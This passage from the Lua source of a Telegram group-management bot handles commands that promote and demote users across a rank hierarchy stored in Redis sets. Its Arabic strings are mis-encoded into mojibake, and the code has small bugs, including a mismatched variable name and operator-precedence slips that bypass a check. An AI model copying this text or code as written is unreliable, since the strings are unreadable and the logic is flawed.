DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'rioconstructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.sender_user_id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text and text:match("^ุชูุฒูู ุงููู @(.*)$") and Manager(msg) and ChCheck(msg) then
local rem = {string.match(text, "^(ุชูุฒูู ุงููู) @(.*)$")}
function remm(extra, result, success)
if result.id_ then
if SudoId(result.id_) == true then
Dev_Rio(msg.chat_id_, msg.id_, 1, "โ๏ธฐูุงุชุณุชุทูุน ุชูุฒูู ุงููุทูุฑ ุงูุงุณุงุณู", 1, 'md')
return false 
end
if DevRio:sismember(Rinda..'Rio:RioSudo:',result.id_) then
Riosudo = 'ุงููุทูุฑูู ุงูุงุณุงุณููู โข ' else Riosudo = '' end
if DevRio:sismember(Rinda..'Rio:SecondSudo:',result.id_) then
secondsudo = 'ุงููุทูุฑูู ุงูุซุงููููู โข ' else secondsudo = '' end
if DevRio:sismember(Rinda..'Rio:SudoBot:',result.id_) then
sudobot = 'ุงููุทูุฑูู โข ' else sudobot = '' end
if DevRio:sismember(Rinda..'Rio:Owner:'..msg.chat_id_, result.id_) then
owner = 'ุงููุงูููู โข ' else owner = '' end
if DevRio:sismember(Rinda..'Rio:BasicConstructor:'..msg.chat_id_, result.id_) then
basicconstructor = 'ุงูููุดุฆูู ุงูุงุณุงุณููู โข ' else basicconstructor = '' end
if DevRio:sismember(Rinda..'Rio:Constructor:'..msg.chat_id_, result.id_) then
constructor = 'ุงูููุดุฆูู โข ' else constructor = '' end 
if DevRio:sismember(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_) then
manager = 'ุงููุฏุฑุงุก โข ' else manager = '' end
if DevRio:sismember(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_) then
admins = 'ุงูุงุฏูููู โข ' else admins = '' end
if DevRio:sismember(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_) then
vipmem = 'ุงููููุฒูู โข ' else vipmem = '' end
if DevRio:sismember(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_) then
cleaner = 'ุงูููุธููู โข ' else cleaner = ''
end
if RankChecking(result.id_,msg.chat_id_) ~= false then
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู โข โค\n~ ( "..riosudo..secondsudo..sudobot..owner..basicconstructor..constructor..manager..admins..vipmem..cleaner.." ) ~")  
else 
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐูู ุชุชู ุชุฑููุชู ูุณุจูุง")  
end 
if RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudoid' then
DevRio:srem(Rinda..'Rio:RioSudo:', result.id_)
DevRio:srem(Rinda..'Rio:SecondSudo:', result.id_)
DevRio:srem(Rinda..'Rio:SudoBot:', result.id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'riosudo' then
DevRio:srem(Rinda..'Rio:SecondSudo:', result.id_)
DevRio:srem(Rinda..'Rio:SudoBot:', result.id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'secondsudo' then
DevRio:srem(Rinda..'Rio:SudoBot:', result.id_)
DevRio:srem(Rinda..'Rio:SecondSudoGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'sudobot' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:SudoBotGp:'..msg.chat_id_,result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'owner' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'rioconstructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'basicconstructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Constructor:'..msg.chat_id_,result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'constructor' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:Cleaner:'..msg.chat_id_, result.id_)
elseif RioDelAll(msg.sender_user_id_,msg.chat_id_) == 'manager' then
DevRio:srem(Rinda..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:srem(Rinda..'Rio:VipMem:'..msg.chat_id_, result.id_)
end
else
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end
end
resolve_username(rem[2],remm)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--     Set RioSudo     --
if Sudo(msg) then
if text ==('ุงุถู ูุทูุฑ ุงุณุงุณู') or text ==('ุฑูุน ูุทูุฑ ุงุณุงุณู') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevRio:sadd(Rinda..'Rio:RioSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^ุงุถู ูุทูุฑ ุงุณุงุณู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุงุณุงุณู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงุถู ูุทูุฑ ุงุณุงุณู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Rinda..'Rio:RioSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุงุถู ูุทูุฑ ุงุณุงุณู (%d+)') or text:match('^ุฑูุน ูุทูุฑ ุงุณุงุณู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงุถู ูุทูุฑ ุงุณุงุณู (%d+)') or text:match('ุฑูุน ูุทูุฑ ุงุณุงุณู (%d+)')
DevRio:sadd(Rinda..'Rio:RioSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--     Rem SecondSudo     --
if text ==('ุญุฐู ูุทูุฑ ุงุณุงุณู') or text ==('ุชูุฒูู ูุทูุฑ ุงุณุงุณู') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:RioSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) == 0 then
else
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^ุญุฐู ูุทูุฑ ุงุณุงุณู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุงุณุงุณู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุฐู ูุทูุฑ ุงุณุงุณู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:RioSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุญุฐู ูุทูุฑ ุงุณุงุณู (%d+)') or text:match('^ุชูุฒูู ูุทูุฑ ุงุณุงุณู (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุฐู ูุทูุฑ ุงุณุงุณู (%d+)') or text:match('ุชูุฒูู ูุทูุฑ ุงุณุงุณู (%d+)')
DevRio:srem(Rinda..'Rio:RioSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู")  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--     Set SecondSudo     --
if RioSudo(msg) then
if text ==('ุงุถู ูุทูุฑ ุซุงููู') or text ==('ุฑูุน ูุทูุฑ ุซุงููู') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevRio:sadd(Rinda..'Rio:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^ุงุถู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงุถู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Rinda..'Rio:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุงุถู ูุทูุฑ ุซุงููู (%d+)') or text:match('^ุฑูุน ูุทูุฑ ุซุงููู (%d+)')) and ChCheck(msg) then
local user = text:match('ุงุถู ูุทูุฑ ุซุงููู (%d+)') or text:match('ุฑูุน ูุทูุฑ ุซุงููู (%d+)')
DevRio:sadd(Rinda..'Rio:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--     Rem SecondSudo     --
if text ==('ุญุฐู ูุทูุฑ ุซุงููู') or text ==('ุชูุฒูู ูุทูุฑ ุซุงููู') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:SecondSudo:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^ุญุฐู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุฐู ูุทูุฑ ุซุงููู @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:SecondSudo:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุญุฐู ูุทูุฑ ุซุงููู (%d+)') or text:match('^ุชูุฒูู ูุทูุฑ ุซุงููู (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุฐู ูุทูุฑ ุซุงููู (%d+)') or text:match('ุชูุฒูู ูุทูุฑ ุซุงููู (%d+)')
DevRio:srem(Rinda..'Rio:SecondSudo:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู")  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Set SudoBot      --
if SecondSudo(msg) then
if text ==('ุงุถู ูุทูุฑ') or text ==('ุฑูุน ูุทูุฑ') and ChCheck(msg) then
function sudo_reply(extra, result, success)
DevRio:sadd(Rinda..'Rio:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),sudo_reply)
end end 
if text and (text:match('^ุงุถู ูุทูุฑ @(.*)') or text:match('^ุฑูุน ูุทูุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุงุถู ูุทูุฑ @(.*)') or text:match('^ุฑูุน ูุทูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Rinda..'Rio:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุงุถู ูุทูุฑ (%d+)') or text:match('^ุฑูุน ูุทูุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุงุถู ูุทูุฑ (%d+)') or text:match('ุฑูุน ูุทูุฑ (%d+)')
DevRio:sadd(Rinda..'Rio:SudoBot:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--       Rem SudoBot      --
if text ==('ุญุฐู ูุทูุฑ') or text ==('ุชูุฒูู ูุทูุฑ') and ChCheck(msg) then
function prom_reply(extra, result, success)
DevRio:srem(Rinda..'Rio:SudoBot:',result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end end
if text and (text:match('^ุญุฐู ูุทูุฑ @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ @(.*)')) and ChCheck(msg) then
local username = text:match('^ุญุฐู ูุทูุฑ @(.*)') or text:match('^ุชูุฒูู ูุทูุฑ @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:srem(Rinda..'Rio:SudoBot:',result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and (text:match('^ุญุฐู ูุทูุฑ (%d+)') or text:match('^ุชูุฒูู ูุทูุฑ (%d+)')) and ChCheck(msg) then
local user = text:match('ุญุฐู ูุทูุฑ (%d+)') or text:match('ุชูุฒูู ูุทูุฑ (%d+)')
DevRio:srem(Rinda..'Rio:SudoBot:',user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู")  
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--   Set RioConstructor   --
if ChatType == 'sp' or ChatType == 'gp'  then
if SudoBot(msg) then
if text ==('ุฑูุน ูุงูู') and ChCheck(msg) then
function raf_reply(extra, result, success)
DevRio:sadd(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ูุงูู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ูุงูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ูุงูู @(.*)')
function promreply(extra,result,success)
if result.id_ then
DevRio:sadd(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ูุงูู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ูุงูู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ูุงูู (%d+)')
DevRio:sadd(Rinda..'Rio:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุฑูุนู ูุงูู")  
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--   Rem RioConstructor   --
if text ==('ุชูุฒูู ูุงูู') and ChCheck(msg) then
function prom_reply(extra, result, success)
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.sender_user_id_) == tonumber(admins[i].user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ูููู ุชูุฒูู ุงููุงูู ุงูุงุณุงุณู', 1, 'md')
else
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ุงููุงูููู")  
end end end
end,nil)
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),prom_reply)
end 
end
if text and text:match('^ุชูุฒูู ูุงูู @(.*)') and ChCheck(msg) then
local username = text:match('^ุชูุฒูู ูุงูู @(.*)')
function promreply(extra,result,success)
if result.id_ then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(result.id_) == tonumber(admins[i].user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ูููู ุชูุฒูู ุงููุงูู ุงูุงุณุงุณู', 1, 'md')
else
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ุงููุงูููู")  
end end end
end,nil)
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุชูุฒูู ูุงูู (%d+)') and ChCheck(msg) then
local user = text:match('ุชูุฒูู ูุงูู (%d+)')
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
if tonumber(user) == tonumber(admins[i].user_id_) then  
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐูุง ูููู ุชูุฒูู ุงููุงูู ุงูุงุณุงุณู', 1, 'md')
else
DevRio:srem(Rinda..'Rio:Owner:'..msg.chat_id_,user)
ReplyStatus(msg,user,"Reply","โ๏ธฐุชู ุชูุฒููู ูู ุงููุงูููู")  
end end end
end,nil)
end end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
--  Set BasicConstructor  --
if Owner(msg) then
if text ==('ุฑูุน ููุดุฆ ุงุณุงุณู') and ChCheck(msg) then
function raf_reply(extra, result, success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.sender_user_id_)
ReplyStatus(msg,result.sender_user_id_,"Reply","โ๏ธฐุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
end 
if tonumber(tonumber(msg.reply_to_message_id_)) > 0 then
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),raf_reply)
end end
if text and text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู @(.*)') and ChCheck(msg) then
local username = text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู @(.*)')
function promreply(extra,result,success)
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
Dev_Rio(msg.chat_id_, msg.id_, 1,'โ๏ธฐูุงุชุณุชุทูุน ุฑูุน ุงุญุฏ ูุฐุงูู ุจุณุจุจ ุชุนุทูู ุงูุฑูุน', 1, 'md')
return false
end
if result.id_ then
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..msg.chat_id_,result.id_)
ReplyStatus(msg,result.id_,"Reply","โ๏ธฐุชู ุฑูุนู ููุดุฆ ุงุณุงุณู")  
else 
Dev_Rio(msg.chat_id_, msg.id_, 1, 'โ๏ธฐ*ุงููุนุฑู ุบูุฑ ุตุญูุญ*', 1, 'md')
end end 
resolve_username(username,promreply)
end
if text and text:match('^ุฑูุน ููุดุฆ ุงุณุงุณู (%d+)') and ChCheck(msg) then
local user = text:match('ุฑูุน ููุดุฆ ุงุณุงุณู (%d+)')
if not RioConstructor(msg) and DevRio:get(Rinda.."Rio:Lock:ProSet"..msg.chat_id_) then 
